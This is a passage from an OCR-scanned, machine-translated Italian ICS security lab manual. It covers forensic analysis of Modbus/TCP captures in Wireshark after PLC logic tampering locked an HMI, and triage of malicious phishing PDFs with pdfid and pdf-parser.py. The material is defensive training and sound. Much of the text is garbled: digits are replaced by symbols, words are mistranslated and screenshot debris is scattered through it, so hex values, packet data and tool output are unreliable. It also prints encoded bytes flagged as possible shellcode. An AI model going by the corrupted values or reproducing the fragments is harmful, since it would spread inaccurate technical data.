oe oP ob oO oO Ob bb eb be be w&

ee 8 e oY

COME

Qs'

a5

*Nota* Il Codice Funzione 2 ad esempio ha una Query e, nella sua Risposta, ha vari valori di Bit, probabilmente non
utile qui.

Informazioni sulla lunghezza del protocollo di origine

192.168.8.9 -168.0.16 Modbus/T.. 66 Interrogazione: 25021; Unità: : 2: Lettura ingressi discreti
-107108 192.168.0.10 -168.0.9 Modbus/T.. 75 Risposta: + 250213 Unità: + 2: Lettura ingressi discreti
-1073@1 192.168.0.9 +168.0.10 Modbus/T... 66 Interrogazione: : 25@22; Unità: 1, Funz: 4: Lettura registri di ingresso
192.168.8.16 ~168.0.9 Modbus/T.. 127 Risposta: + 25022; Unità: 1, Fune: + Leggi registri di input
192.168.8.9 +168.0.18 Modbus/T.. 66 Interrogazione: : 25823; Unità: 1, Funz: 3: Lettura registri di mantenimento
192.168.6.18 .168.6.9 Modbus /T.. 127 Resoonse: : 25023: Unità: 1. Func: : Lettura registri holding

Lunghezza: 15
Identificatore dell'unità: 1
ModBus
988 010 = Codice funzione: Lettura ingressi discreti (2)
[Richiedi frame: 2]
[Tempo dalla richiesta: ©.003476000 secondi]
Conteggio byte: 12
> Bita:@

*Nota* Il codice funzione 3 interroga i dati dai registri nella risposta alla query, quindi è promettente ma
arriva solo fino al registro 31 nei pacchetti che stiamo esaminando. Quindi potrebbe essere utile per la nostra domanda, ma lo è
Holding Registers e non Input Registers, è ragionevole sospettare che le modifiche di valore avvengano in Input
Registers, ma potremmo tornare su questo argomento se non avessimo un’opzione migliore (avremo un’opzione migliore).

3 61:53:05, 110462 T52,168.0.5 152,168.0.10 _Nodbus/T~ 3: Lettura registri di mantenimento
192.168.9.10 192.168.0.9 Modbus/T.. 3: Lettura Reeister di attesa
Registro 29 (UINTI6 ~
Numero di registro: 29
Valore del registro (UINTI6): 0
Y Registro 30 (UINTI6): @
Numero di registro: 30
Valore registro (UINTI6): @
Y Registro 31 (UINTI6): @
Numero di registro: 31
Valore registro (UINTI6): @

*Nota* Il codice funzione 4 esegue query dai registri nella risposta e arriva fino al registro 31 nel pacchetto
stiamo guardando. Vogliamo davvero il registro 50, quindi dobbiamo vedere se ci sono altri valori oltre a
quelli che vanno fino al registro 31. Qualsiasi campionamento dei valori del codice funzione 4 mostrerebbe che la query fornisce un riferimento
Numero del registro desiderato. 0 li darà tutti e qualsiasi altro numero darà quello esatto.

@: Leggi i registri di input
leggere i registri di input
1, Funz: 1: Leggi bobine
1, Funz: 1: Leggi bobine

1918 @1:53:21.420581 192.168.0.8 192.168.0.9 Modbus/T.. 66 Interrogazione:
253:21.421322 192.168.0.9 192.168.0.8 Modbus/T... 65 Risposta:
435526 192.168.0.8 192.168.0.16 Modbus/T.. 66 Interrogazione: Trans: 351;
1921 @1:53:21.439289 192.168.2.10 192.168.2.8 Modbus/T.. 78 Risposta: Trans: 351;
Checksum: @x8188 [non verificato]
[Stato checksum: non verificato]
Puntatore urgente: 0
[Analisi SEQ/ACK]
[Timestamp]
Carico utile TCP (12 byte)
[Dimensioni PDU: 12]
ModBus/TCP
Identificativo della transazione: 43
Identificatore del protocollo: @
Lunghezza: 6
Identificatore dell'unità: 1
ModBus
+8 100 = Codice funzione: Lettura registri di ingresso (4)
Numero di riferimento: 1
Conteggio parole: 1

© 2021, Robert M. Lee Lab 4.2-9
> [Timestamp]
Carico utile TCP (11 byte)
[Dimensione POU: 11]
ModBus/TCP
Identificativo della transazione: 43
Identificatore del protocollo: @
Lunghezza: 5
Identificatore dell'unità: 1
ModBus
-@8@ @10@ = Codice funzione: Lettura registri di ingresso (4)
[Rea Cornice: 1918
[Tempo dalla richiesta: @.000741@0@ secondi]
Conteggio byte: 2
Y Registro 1 (UINTI6): 100
Numero di registro: 1
Valore registro (UINT16): 100

65 Risposta:

1919 421322 192.168.0.9 192.168.8.8 Modbus/T.. Trans?
* 192.168.0.8 192.168.9.18 Modbus/T... 66 Interrogazione: Trans:
192.168.0.10 192.168.0.8Modbus/T. 78 Risposta: Trans:

435 Unità:
351; Unità:
351; Unità:

a, Fune:
1, Funzione:
1, Funzione:

4: Leggi i registri di input
1: Leggi bobine
1: Leggi bobine

*Nota* Pertanto stiamo cercando una query che abbia un numero di riferimento pari a 50 per il registro 50 che è il
valore decimale per DS51.Una rapida revisione dei valori HEX ci dirà esattamente cosa cercare (sostituendo il file

valore con il valore per 50):

ModBus

Numero di riferimento: 1
Conteggio parole: 1

feb

UN

-8@@ @1@@ = Codice funzione: Lettura registri di ingresso (4)

@@ 34 aa 53 46 G8 5@ 66
9020 @@ @9 cc fc O1 F6 38 2a
0830 28 13 81 88 88 68 @@ 2b
oese (ERY

@@ @c 29 Be af bl O@ @c 29 18 b5 Bf G8 GB 45 OO
66 66 c@ ad 68 O38 cO ad
Di 3c a7 2 F7 7@ 5@ 18
66 86 8 6 61

*Nota* Nel pacchetto di query per il codice funzione 4 vedremo che l'identificatore unito è 1 e il codice funzione è 4

per un valore HEX di 0x0104.

*Risposta* È molto probabile che il codice funzione 4 sia la query utile e il suo identificatore HEX è 0x010400. Il valore
per il numero di riferimento 50 sarebbe 0x32 in HEX. Pertanto, stiamo cercando 0x01040032.

4. Qual è il primo pacchetto in cui avviene la scrittura in questa sessione e a che ora?

> Cerca 0x01040032 nell'acquisizione dei pacchetti
> In Wireshark scegli Modifica > Trova pacchetto

> Inserisci 01040032 nel campo e fai clic su Trova

> Cerca valori diversi nel registro 50

© 2021, Robert M. Lee

Pacchetto 6552
2021-07-11 alle 05:54:00 UTC

Laboratorio 4.2-10

RPRmomnmnemnmenemnmeeoewe*ee*oem*nenen#eeoensee*e® ® ® ® © ®
ab vn ty “5

@ hmilocked.pcap
File Modifica Visualizza Vai Acquisisci Analizza Statistiche

4 Copia »
Wid e trova pacchetto... Ctrl+F
ind Avanti Ctrl+N

Trova Ctri+B precedente

Seleziona/Deseleziona pacchetto Ctrl+M
Seleziona tutto visualizzato Ctrl+Maiusc+M

eS)

ouoao0s2

Informazioni sulla lunghezza
us T= 127 Risposta: Trans: 25659; Unità: 1, Funz: 3: Lettura registri di mantenimento

5078 @1: 248758 192.168.8.8 192.168.¢.10 Modbus /T.. 66{ Richiesta: Trans: 378; Uni: Leggi i registri di input |
5079 01:53: 249344 192.168.@.10 192.168.0.8 Modbus/T... 65 Risposta: Trans: 378; Unità 1, Funz: 4: Lettura registri di ingresso
5082 @1:53:48.309661 192.168.@.9 192.168.6.18 Modbus/T.. 66 Interrogazione: Trans: 26537; Unità: 1, Funz: 2: Lettura ingressi discreti

5983 01:53:48.313269 192.168.@.10 192.168.2.9 Nodbus/T... 75 Risposta: Trans: 26537; Unità: 1, Funz: 2: Lettura ingressi discreti
5@85 01:53:48.313665 192.168.@.9 192.168.@.18 Modbus/T... 66 Interrogazione: Trans: 26538; Unità: 1, Funz: 4: Lettura registri di ingresso

Identificatore dell'unità: 1
SìModbus
+80 @100 = Codice funzione: Lettura registri di ingresso (4)
Numero di riferimento: 58
Conteggio parole: 1

06 do 7c 1a 17 43 00 Oc 29 18 bS BF 08 G8 4500 --|--C-- ) E

00 34 €2 bb 49 08 52.06 00 Oe co as eB Os co as «4B
0@ @a cd 94 01 £6 bd 25 ea SF dB c9 cB 17 50 18 , en
0036 fe 1c 81 89 02 09 @1 7a 6 G0 90 26 O1 HE ee 32 zee Bo
42 8 @1 *

*Nota* Ora che abbiamo la query giusta dobbiamo scegliere una risposta e vedere i valori.

5079 @1:53:48.249344 192.168.0.10 192.168.8.8 Modbus/T. 65 Risposta: Trans: 378; Unità: 1, Funz: 4: Lettura registri di ingresso
5@82 01:53:48. 30966 192.168.0.9 192.168.0.1@ Modbus/T.. 66 Interrogazione: Trans: 26537; Unità: 1, Funz: 2: Lettura ingressi discreti
48313269 192.168.@.18 192.168.0.9 Modbus/T.. 75 Risposta: Trans: 26537; Unità: 1, Funz: 2: Lettura ingressi discreti
313665 192.168.8.18 Modbus/T.. 66 Interrogazione: Trans: 26538; Unità: 1, Funz: 4: Lettura registri di ingresso

[Tempo dalla richiesta: 0,004586000 secondi]
Conteggio byte: 2
© Registro S@ (UINTI6): @
Numero di registro: 58
Valore registro (UINTI6): @
908 00 @c 29 18 bS Bf 22 de 7c 1a 17 43 88 08 45 00
02 33 cf c9 08 0 42 06 29 99 c@ af 00 Ga cd a8
@@ 08 @1 £ 6 cd 94 d3 c9 cB 17 bd 25 ea Gb 50 18
82 6c OF 72 G0 02 01 7a G0 20 00 05 01 04 02 20
eee

*Nota* Come sospettavamo, ci ha dato il registro 50. Vediamo che il valore del registro è 0. Questo è appropriato
e cosa dovrebbe accadere, ma sappiamo dalla manipolazione logica che si verifica un 1 per bloccare l'HMI.
Vediamo che il valore HEX per la risposta del registro 50 con valore del registro pari a 0 è 0x0104020000.
Pertanto dovremmo aspettarci di vedere 0x0104020001 per una risposta 01 scrivendo così dal PLC all'HMI.

> Cerca 0x0104020001 per verificare che esista e scoprire a che ora si verifica
> In Wireshark scegli Modifica > Trova pacchetto

© 2021, Robert M. Lee Lab 4.2-11
> Inserisci 0104020001nel campo e fai clic su Trova
> Analizzare i pacchetti

col Informazioni sulla lunghezza

noi/T. 131 Domanda: Trans: 26968; Unità: 1, Funz: 16: Scrittura di più registri
us /T 66 Risposta: Trans: 26968; Unità: 1, Funz: 16: Scrittura di più registri

Domanda: Trans) 373: nits 1 euines

1. Leggi le bobine

*Nota* Dopo aver premuto Trova vediamo che il pacchetto esiste, continua a fare clic su Trova per tornare al primo
caso in cui ciò avvenga.

6552 61:54:00.669530
6553 @1:54:00. 703885
6554 01:54:00. 705505
6556 @1:54:0@. 705781
6557 @1:54:8, 708419
6559 @1:54:08. 708578
6561 @1:54:00.710438
6563 @1:54:0@.710798
6564 @1:54:@@.713521

~ [Richiedi frame: 6551]

Conteggio byte: 2
Y Registro 5@ (UINTI6): 1
Numero di registrazione: 5@

@000 @@ Oc 29 18 b5 Bf ee de
28 33 di cl @@ 88 40 06
@@ @8 G1 #6 cd 94 dB c9
@2 6c G1 2e 28 CO G1 7a

[Tempo dalla richiesta: @.904966000 secondi]

Valore del registro (UINTI6): 1

192.168.9.18Modbus/T.
192.168.0.9Modbus/T..
192.168.8.18Modbus/T..
192.168.0.9Modbus/T..
192.168.0.10Modbus/T.
192.168.0.9Modbus/T..
192.168.0.18Modbus/T..
192.168.0.9Modbus/T...
192.168..10Modbus/T..Fe 1s 17 43 08 08 45 20 yovees [eee -E* ~
27 alcoa808GacoaB3B
42 8b bd 25 ed 3b 50 18 %5P

08 @@ 00 05 61040208 Lez

65 Risposta:
66 © Domanda:
75 Risposta:
66 Domanda:
127 Risposta:
66 Domanda:
127 Risposta:
131 Quer;
66 Risposta:

378;

: 26973;
226973;
126974;
226974;
: 26975;
: 269753
: 26976;
: 26976;

unità:
Unità:
unità:
Unità:
unità:
unità:
Unità:
unità:
Unità:

-

Bawwrann

: Leggi i registri di input

: Leggi i registri di input

: Leggi i registri delle aziende

: Leggi i registri delle aziende

: Scrivi più registri
+ Scrivi più registri)

+ Leggi i registri di input |

Leggi ingressi discreti
Leggi ingressi discreti

*Nota* Vediamo che la prima istanza del valore di registro 1 è nel pacchetto 6552. Puoi andare in Modifica >
Preferenze e modifica la visualizzazione dell'ora se desideri ottenere un orario più riconoscibile.

@Wireshark. Preferenze

-

X

v Aspetto — ' - _ - _ ;
Colonne visualizzate Tipo titolo Campi Occorrenza campo
| Carattere e colori) | Nessun numero
Disposizione | | Ora Data UTC, nel formato AAAA-MM-GG, e ora
Cattura | Sorgente iM Indirizzo della sorgente
Expert M4 Destinazione Indirizzo di destinazione
Pulsanti filtro 4 Protocollo Protect
Nome Risoluzione 4 Lunghezza Lunghezza del pacchetto (byte) |
Protocolli e Informazioni Informazioni
Chiavi RSA
L_> Statistiche |

© 2021, Robert M. Lee

Laboratorio 4.2-12

a ® B® ® fO Of ww ®

@® @® @ ®

)

se» ® ® .

®
a7 wa

/-

Le’ is’ ca’ a a a a ie

iB

“5!

6552 2021-@7-11 @5:54:00.669530 192.168.0.10

| 6553 2021-07-11 @5:54:00.703085 192.168.0.9
| 6554 2021-07-11 @5:54:00.7055@5 192.168.0.10
| 6556 2021-07-11 @5:54:@0.705781 192.168.@.9
| 6557 2021-07-11 @5:54:00.708419 192.168.0.10
| 6559 2021-07-11 @5:54:00.708578 192.168.0.9
| 6561 2021-07-11 @5:54:00.710438 192.168.0.10
: 6563 2021-07-11 @5:54:00.710799 192.168.0.9
' 0.713521 192.168.0.10

6564 2621-07-11 @5:54:

PS oe hae a ea eco es eae |
-@@@ @10@ = Codice funzione: Lettura registri di ingresso (4)
Richiedi Telaio: 6551
[Tempo dalla richiesta: @.2040660@8 secondi]

Conteggio byte: 2
Y Registro 5@ (UINT16): 1
Numero di registrazione: 5@
Valore registro (UINT16): 1

*Risposta* Il primo pacchetto era 6552 e si è verificato il 2021-07-11 alle 05:54:00 UTC.

Esercizi da asporto

Questi due laboratori hanno evidenziato i seguenti punti chiave:

I PLC possono essere manipolati attraverso la loro logica per causare confusione tra logica e fisica
stati; gli operatori possono capirlo ma non aspettarselo come risultato di un attacco informatico

La logica del PLC è un bersaglio maturo di un compromesso in stile bomba logica che porta al verificarsi di una logica specifica
nelle giuste condizioni o nel momento giusto

e Alcuni sistemi HMI possono essere guidati dai livelli inferiori e questo è un vettore insolito per un attacco ma
efficace in quanto verrebbe probabilmente considerato un problema di manutenzione

e Il ripristino della logica "nota come valida" del PLC non sempre riscrive i dati corrotti a seconda di dove si trovano i dati
se è memorizzato nel sistema e se si trova nella memoria volatile o non volatile

e L'analisi del traffico di rete con la comprensione dei valori del protocollo ICS può essere una fonte fantastica
dati forensi per l'analisi delle cause profonde, indipendentemente dal fatto che il problema sia o meno un attacco informatico

© 2021, Robert M. Lee Lab 4.2 - 13
bene, bene

Ww

ww wo ww ww Ww

Ww

ww wy ww WwW

Lab 4.3 - Analisi delle email di phishing

e —_ Familiarizzazione con buoni PDF.
e Identificazione di PDF potenzialmente dannosi.

*Informazioni sullo scenario* Questo laboratorio nel tema dello scenario vorrebbe vedere come funziona Calistoga
Si è verificato un incidente alla raffineria, ma stiamo utilizzando vere e-mail di phishing in modo che tu abbia esperienza con loro, e
questo laboratorio è disconnesso dallo scenario.

Preparazione agli esercizi

Questo esercizio utilizzerà la VM RELICS. Dovrai copiare i PDF nella VM RELICS dal tuo corso
ISO dal file ICS515_PDFs_Lab3_3_Analyzing_Phishing_Emails.zip. Puoi svolgere il laboratorio ovunque
la VM RELICS ma per far corrispondere gli screenshot al laboratorio creare una cartella aggiuntiva nella cartella ics515 sul
RELICS VM Desktop ed estrai i PDF in quella cartella. I PDF sono in uno zip protetto da password. IL
la password è ICS515ATTENZIONE#

Non estrarre i PDF all'esterno della VM poiché sono dannosi.

Domande

Cosa si è rivelato probabilmente dannoso in water_update_part2.pdf?

Il PDF sulla revisione della postura nucleare sembrava dannoso a prima vista?
Quale oggetto n. sembrava più sospetto nel PDF della conferenza?

Quante volte sono stati utilizzati /Encrypt e /JavaScript nel PDF della conferenza?

PeNP

© 2021, Robert M. Lee Lab 4.3-1
Compito – Familiarizzare con buoni PDF:

*Nota* Comprendere la struttura completa di un PDF e le varie versioni non rientra nell'ambito di questo corso.
Tuttavia, questa parte del laboratorio ti consentirà di familiarizzare con alcuni buoni PDF e i dati in essi contenuti.

> Avvia la tua VM RELICS.

> Accedi alla VM:
> ACCEDI =reliquie
> PASSWORD = reliquie

> Navigare nella cartella con i PDF:
> Apri un terminale.
> Eseguire il seguente comando nel terminale:
cad /home/relics/Desktop/ics515/extra

*Nota* PDF-parser.py verrà prima utilizzato per analizzare PDF1 per determinare tutte le informazioni inserite nel PDF, come
come oggetti.Invece di leggere le informazioni nel terminale di comando, verranno emesse (usando il tasto ">"
comando) in un file di testo per essere letto più facilmente.

> Analizza PDF1 con pdf-parser.py.

> Nel prompt dei comandi, inserisci:
pdf-parser.py PDFl.pdf > parserl.txt

fl Ter

pdf-parser.py PDFi.pdf > parseri.txt

> Apri parser1.txt nell'editor di testo:
> Passare a ics515 > Cartella extra dalla GUI del desktop.
> Fare clic con il pulsante destro del mouse su parser1.txt e selezionare Apri con editor di testo.
> Leggi parser1.txt.

*Nota* Notare il modello generale degli Oggetti (obj) e le informazioni che contengono. Informazioni come caratteri
occupa buona parte del documento. Quando ti chiedi cosa significhi un comando, come /FlateDecode,
puoi rapidamente cercare su Google le informazioni per determinare la funzione. In questo caso, FlateDecode funge da a
algoritmo di compressione per condensare le informazioni (utile sia agli aggressori che ai difensori). Interessante
da questo tipo di analisi possono essere rivelate informazioni, ad esempio quale è la struttura generale del documento
assomiglia, o chi è l'Autore e quando era la data di creazione.

© 2021, Robert M. Lee Lab 4.3-2

>

™,
va

come 4s 3

aa

1372 Riferimenti:
1373

1374 <<

1375 © /Autore

1376 {Creatore '(p9\xOOM\x0e1\x00c\xOe@r\xOG0\x0Os\x080\xOOf\xO8t\xAGa\x08 \xOOW\xOG0\xOOr\xGOd\x0@ \x002\xe00\x001\x000) '
1377 /Data di creazione "(0:20150123112257-06'60')"

1378 /ModDate "(D:20156123112257-06'00')"

1379 {Produttore '(b9\xO@M\x0Ot\x80c\xGOr\x8G0\x00s\x000\xOOf\xO6t\xd08\x00 \xGOW\x600\x00r\xO0d\xG0 \x002\x000\x001\x000)'
1380 >>

1381

1382

*Nota* Essere in grado di ispezionare manualmente un documento PDF è utile, ma per riferimenti più rapidi, lo strumento pdfid può farlo
essere usato.

> Utilizza pdfid per analizzare PDF1.pdf.
> Nel prompt dei comandi, inserisci:
pdfid.py PDF1l.pdf

$ pdfid.py PDF1.pdf
PDFiD 0.2.7 PDF1.pdf
Intestazione PDF: %PDF-1.5
ogg

endobj

flusso

endstream

xrif

trailer

startxrif

{Pagina

/Crittografa

/Obiettivo

{3 secondi

/JavaScript

/AA

/OpenAzione
/AcroForm
/IBIG2Decodifica
/RichMedia

/Lancio
/File incorporato

/XFA

/URI

{Colori > 2%24

oh

paga

D>NN NM PR

*Nota* pdfid cerca determinate parole chiave e informazioni per fornire un conteggio delle informazioni all'utente. Questo
document ha 94 oggetti, non utilizza JavaScript, non ha crittografia e non ha
File incorporati. È difficile determinare un file buono o cattivo semplicemente guardandolo, ma comprendendo il file
la struttura di un PDF e il tipo di informazioni utilizzate in modo improprio possono essere utili per identificare potenziali dannosi
documenti per ulteriori analisi. Dedica qualche minuto e ripeti i passaggi da 4 a 7 su PDF 5 e PDF 6 per notarlo
differenze tra i diversi tipi di PDF.

© 2021, Robert M. Lee Lab 4.3-3
Attività: Identificazione di PDF potenzialmente dannosi j

1. Cosa si è rivelato probabilmente dannoso in water_update_part2.pdf?
Più %EOF e Javascript

> Analizza water_update_part2.pdf con pdf-parser.py.
> Nel prompt dei comandi, inserisci:
pdf-parser.py water_update_part2 .pdf > parser-water.txt

§ pdf-parser.py water_update_part2.pdf > parser-water.txt

> Apri parser-water.txt con l'editor di testo:
> Leggi il file e nota le differenze rispetto a PDF1, PDFS e PDF6.
> Cerca oggetti anomali.[183 Commento PDF '%%EOF\n'

184

185 Commento PDF '%\ xab\xa7n\xde\xdd\xdd\xa1\xe5&\xa9%\xab\xa7j\xdc\xdd\xdd\xa1\xe5&\xa9%\ xab\
\xab\xa7\xie\xde\xdd\xdd\xa1 \xe58 \xab\x9f \x1a\xde\xdd\xdd3\xa2"""\xaf\xafr\xde\xdd\xddsh"
\xaig\x9e&\xc9\xcbH"H" \xa9\xa7\x1e\xdc\xdd\xddr\xa90\x9es \xddw\ xfa\xaf\xb7\x06\xdd\ xdd\xd
H"H 3"""\ xe2\xaf\xaf\x06\xdd\ xdd\xdds \ xddw\xfe\xabg\xe6\xe5\xa7\x16\xdc\xdd\xdd""""\xa9\x)
\xai\xai"""H" \xafo\x96s2"&"" \xaf\ xb7\x16\xd8\ xdd\ xddp\ xa9g\x9er \xddw\xc2\xe5g\x8a""""\xc9
\x9e\xa67\x16\xd8\xdd | xdd\x11g\x86\xa90\xBa\xaa\xa6/\x16\xdB\xdd \xdd\ xaow\x86\ xa \xc8#\xa
\xa6\xab"""H"\xafo\x96s\xa9\xb7\x16\xdc\xdd\ xdd\ xe3\xco(\xa9\xa7j\xdc\xdd\xdd\t\xeOr \xaf\
\xa9q\x8a\xal\xe2#\xabg\x8a\xa9\xaf\x16\xde\xdd\ xdd\xe3\xc3(\xa9\xb7j\xdc\xdd\ xdd\ t\xF3\x
\x9c\xae\ '\x16\xdB\xdd\xdd\x110\x86\ xa9w\ xBa\ xaa\ xae7 \x16\xd8\xdd\xdd\ xa9g\x86\xa1\xca#\x
\xa7j\xde\xdd\xddr \xa90\x9es\xddw\xfaH"J\xa2"""H H"H
3"""'\xe2\ xaf\xb7\x06\xdd\ xdd\ xddp\ xddw\xfe\xabg\xe2\xe5\xa7\x16\xde\xdd\xdd"""\xa9\xa7F\
\xa90\x8a\xa1\xe3#\xabo\x8a\xa3_\x8a"&""Q8\xa9w\xBa -
\x9c\xa67\x16\xdB\xdd\xdd\ xa \xd2U\ xa9o\xBa\xaa\xa6//\x16\xd8\xdd\xdd\xc9\xf 6H" \xafw\x92p\
\xa6\xa2"""H"\xafg\x96r\xa9\xaf \x16\xdc\xdd \ xdd\ xe3\xc3 (\xa9\xb7F\xde\ xdd\ xdd\ t\xf3p\xaf\
\xa9w\xBa\xa1\xeo#\ xabw\ xBa\xa9\xa7\x16\xde\xdd\ xdd\xe3\xc2(\xa9\xaff\xdc\xdd\xdd\t\xea\x
\x9c\xa67\x16\xdB\xdd\xdd\xa1\xd2U\xa9o\xBa\xaa\xa6 /\x16\xd8\xdd\xdd\xc9\xe5H" \xafw\x92p\
\x02e\xe4%\x00\ xaf\x97\x06\xdd\ xdd\xddled\ xa8<\xaa=\xa2\x1c"W\xd7\xe4%-
\x00e\xe4%" \xaf\xaf \xf2\xdc | xdd\ xdds | xaf\xb7\xc2\xdc | xdd\\xddpH"H"H"H"H"H" \xaf\xa7r\xde\xd
\xdit\xa9T\x02! \xd1\x11\xebqkc\x8fy! \xe1q\x11\xf9-\x9c2\x18\ xf4v*\xe3\xe9%! \xF8b\xc9\xd3\
\xeOu\xaf\x9F\xee\xdd\xdd\ xdd\xa9o\xea\xal\xe5&\xcO\xd9\ x89} \xa1\xe58\xa9\xF8| -
{\xddg\xea\xei\xca{\xd9\xdd\ xdd\xcf\x8d\xdd\x96\xac1(\x8ea\x9c\x8e\xF9\xb1\x10\ xc6\xb6\ x9

186

187xrif

188

rimorchio 189

199 <<

191 {Taglia 16
192 /Radice 1 OR
193 >>

194|

195 startxrif 32021
196

197 Commento PDF '%%EOF\n'
198

199 Commento PDF '%S#"! \x1f\xte\x1d\xic\x1b\x1a\x196csm*\x13\x12\x11\xd2\x00\xde\r'

Aaa

© 2021, Robert M. Lee Lab 4.3-4

( ( ee ( ee, ee

eh

iad

eh

cadavere

7?

co

>
«ed

Ww

Ww

w

Ww

sì

ip

Bs'

È

e.a

*Nota* In parser-water.txt, noterai che la struttura è significativamente diversa da PDF1, PDF5 e
PDF6. Nello specifico, ci sono numerosi commenti PDF. Questa è un'area in cui è possibile posizionare il codice su cui eseguire
esecuzione del documento. Ciò che rende questo file particolarmente interessante sono le numerose note %EOF. Un veloce
La ricerca di Google mostrerà che% EOF sta per End of File e viene utilizzato per denotare la fine del PDF. PDF1, PDF5,
e PDF6 avevano tutti un solo% EOF. Eppure ci sono numerosi %EOF in questo file. Questa è una bandiera rossa. Inoltre,
non ci sono informazioni sull'autore. Niente rende istantaneamente dannoso un PDF, ma questi tipi di segnali d'allarme dovrebbero farlo
comunicare all'analista che è necessaria un'analisi successiva, ad esempio eseguire il file attraverso un malware automatizzato
sandbox di analisi (discusso più tardi oggi).

> Utilizza pdfid per analizzare water_update_part2.pdf.
> Nel prompt dei comandi, digitare il comando:
Pdfid.py acqua _update_part2.pdf

*Nota* Ancora una volta, nota la differenza tra PDF1, PDF5 e PDF6. Ci sono più End Objects e End Streams
oltre a oggetti e flussi iniziali, viene utilizzato JavaScript e ci sono EmbeddedFiles. Nessuno di
questi casi di per sé sono dannosi, ma destano preoccupazione. JavaScript, ad esempio, è comunemente
utilizzato nei PDF da malware per eseguire codice sul sistema o per raggiungere un server Web per scaricare un file
sfruttare o aprire l'accesso a un avversario. Quando si alzano abbastanza segnali d'allarme, fidati del tuo istinto.

S$ pdfid.py water_update_part2.pdf
PDFiD 0.2.7 water_update_part2.pdf
Intestazione PDF: %PDF-1.5
ogg

endobj

flusso

endstream

xrif

trailer

startxrif

/Pagina

/Crittografa

/Obiettivo

/3s

{JavaScript

/AA

/OpenAzione
/AcroForm
/IBIG2Decodifica
/RichMedia

/Lancio
/File incorporato

/XFA

/URI

/Colori > 2424

*Nota* Anche l'utilizzo di JavaScript è potenzialmente dannoso e preoccupante poiché non dovremmo vederlo in questi
tipi di PDF.

© 2021, Robert M. Lee Lab 4.3-5
*Risposta* L'uso multiplo di %EOF e Javascript

2. Il PDF sulla revisione della postura nucleare sembrava dannoso a prima vista? NO

> Analizza il documento di ricerca sulla revisione della postura nucleare 2010.pdf con pdf-parser.py.
> Nel prompt dei comandi, inserisci:

pdf-parser.py Ricerca\ Documento\ sul\ Nucleare\ Postura\ Revisione\

2010.PDF > nucleare.txt

eal Terminal

S$ pdf-parser.py Ricerca\ Documento\ sul\ Nucleare\ Postura\ Recensione\ 2010.PDF > nuclear.txt

1 Questo programma non è stato testato con questa versione di Python (3.8.5)

2 In caso di problemi, utilizzare Python versione 3.7.5
3 Commento PDF '%PDF-1.6\n'

4

50bj 10

6 Digitare: /FileIncorporato

7 Riferimenti:

8 Contiene il flusso

-]

10 <<

41 /Filtro /FlateDecodifica
12 /Lunghezza 2060

13 /Tipo /Fileincorporato
14 >>

È

16

17 oggetto 2 0

18 Tipo:

19 Riferimenti: 3 OR

20

21 <«

22 VQ

23 /Bambini [3 © R]
24 /T (topmostSubform[0])

25 >>

26

27

28 oggetto 3 0

29 Tipo:

30 Riferimenti: 20R, 40R
31

32 <<

33 /Genitore 20R
34 /Bambini [4 0 R]
35 /T (Pagina1[0])
36 >>

© 2021, Robert M. Lee

Laboratorio 4.3-6

Rif]

FM

>

=

2

>
Te

as 45 45 eo iB a5 \s 4B py ae a

45

*Risposta* No, il file non sembra dannoso al primo passaggio. Mentre alcuni PDF saranno ovviamente dannosi, altri
sono realizzati in modo più esperto e non presentano segni evidenti di essere dannosi senza analisi con strumenti speciali.
In questo caso, probabilmente vorrai eseguire questo PDF in una Sandbox per determinare se era dannoso.

3. Quale oggetto n. sembrava più sospetto nel PDF della conferenza? Oggetto 388

> Analizzare le informazioni sulla conferenza_Conferenza IFANS 2010 sugli affari globali (1001).pdf con pdf-
parser. pi.
> Nel prompt dei comandi, inserisci:
pdf-parser.py Conferenza\ Informazioni 2010\ IFANS\ Conferenza\ su\
Global\Affari\\(1001\).pdf > global.txt

74 oggetto 388 6
75 Tipo:
76 Riferimenti:

7 <<

79 /Lunghezza 128

80 /Filtro /Standard

81 /0 "(\x80ZKip\x9bg\xOb-0} 6\xOe\x8a\xO5v6. \x18\x9F *6q\x95; \x9a\x991A\xO3C)'

82/P-3392

83 {R3

84 /U '(\x81¢s! \xa05aecE\x9d61\\n\ x1 FA\x17\x00\ x00\ x00\ x00 \ x90 \ x80\ x00\ x00\ x00\ x00\ xO0\ x00\x00\x00 \x00\x00) '
v2

86 >>

*Nota* I caratteri non standard in quello che dovrebbe essere un PDF in lingua inglese risaltano immediatamente
strano. Questi, combinati con i valori HEX nell'oggetto che sono molto diversi dal resto del PDF,
fai sembrare che l'Oggetto 388 contenga shellcode, che sarebbe un meccanismo comune da eseguire nei PDF
comandi su un sistema e spesso raggiungono domini dannosi per estrarre ulteriore codice dannoso.

*Rispondi* Oggetto 388
4. Quante volte sono stati utilizzati /Encrypt e /JavaScript nel PDF della conferenza? 2 ciascuno
> Analizza le informazioni sulla conferenza_Conferenza IFANS 2010 sugli affari globali (1001).pdf con pdfid.py
> Nel prompt dei comandi, inserisci:

pdfid.py Conferenza\ Informazioni _2010\ IFANS\ Conferenza\ su\
Global\Affari\\(1001\) .pdf

© 2021, Robert M. Lee Lab 4.3-7
pdfid.py Conferenza\Information_2010\IFANS\Conferenza\su\Global\Affaire (1001\).pdf
DFiD 0.2.7 Con ce Information_2010 Conferenza IFAN sugli affari globali (1001) .pdf
Intestazione PDF: %PDF-1.6
ogg
endobj

flusso
endstream

xrif

trailer
startxrif
/Pagina

/Crittografa
/Obiettivo

{3 secondi
/JavaScript
/AA
/OpenAzione
/AcroForm
/IBIG2Decodifica
/RichMedia
/Lancio
/File incorporato
/XFA

/URI

{Colori > 2424

WNNNN

NPAN

eh

*Nota* Vediamo che JavaScript e Encrypt sono stati entrambi utilizzati 2 volte ciascuno. È estremamente anormale averlo
crittografia in un PDF che di per sé non è crittografato. JavaScript e crittografia come combinazione, soprattutto in caso contrario
i normali PDF, o quelli che si trovano in operazioni come manuali dei fornitori e guide di formazione, sono un segnale di allarme
è necessario indagare immediatamente.

Esercizi da asporto

L'analisi manuale dei PDF può essere difficile, soprattutto senza una conoscenza approfondita delle strutture e delle differenze dei PDF
tipi di versione e autori di malware che lavorano per offuscare i loro sforzi. Tuttavia, analisi PDF manuale tramite
strumenti come pdfid e pdf-parser.py possono aiutare gli analisti a identificare rapidamente i PDF dall'aspetto strano e quelli che
sollevare segnali d'allarme utilizzando funzioni non comuni o più funzioni non comuni, come /Encrypt e
/JavaScript. Sono disponibili altri strumenti, come pdfextract che può estrarre file e script in un PDF
essere visualizzati, sottoposti ad hashing e analizzati. Inoltre, sono state aggiunte nuove funzionalità all'analisi manuale dei PDF
